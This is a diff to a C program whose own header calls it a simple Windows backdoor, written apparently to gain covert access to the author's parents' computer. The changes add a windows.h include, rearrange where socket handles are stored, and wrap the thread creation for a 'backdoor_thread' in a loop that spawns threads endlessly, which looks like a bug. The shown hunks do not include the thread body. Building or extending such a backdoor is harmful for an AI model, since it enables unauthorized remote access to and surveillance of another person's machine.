@@ -1,9 +1,21 @@
+/*
+ ****************************************************************
+ * A simple backdoor for Windoze...                             *
+ **************************************************************************
+ *  /////////////////\\\\\\\\\\\\\\\\\\\\              BY                 *
+ * //////// My DAD and Step Mom  \\\\\\\\\            P.R.S.              *
+ * \\\  .:[P R S T U V W X Y NOSEY]:.  ///   I'm 29 years old, and they   *
+ *  \\\\\\\\\\\\\\\\\//////////////////// still wanna' pry (never stops). *
+ **************************************************************************
+ */
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stddef.h>
 #include <errno.h>
 #include <unistd.h>
 
+#include <windows.h>
 #include <winsock2.h>
 
 #define MY_PORT 8888
@@ -76,6 +88,7 @@ main()
 	TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
 	/* listen for connections */
 	TERMINATE(TERMINATE_ERROR, listen(sockfd, 20) < 0, strerror(errno));
+	program.serverfd = sockfd;
 
 	for(;;) {
 		int clientfd;
@@ -85,12 +98,11 @@ main()
 
 		/* accept connection */
 		clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
+		if(clientfd > 0) program.clientfd = clientfd;
 		pzero(message, sizeof(message));
 		sprintf(message, "%s: client connected.\n", inet_ntoa(client.sin_addr));
 		puts(message);
-		program.serverfd = sockfd;
-		program.clientfd = clientfd;
-		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&backdoor_thread, &program, 0, 0);
+		while((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&backdoor_thread, &program, 0, 0)));
 	}
 
 	while(WaitForSingleObject(hThread, 0));
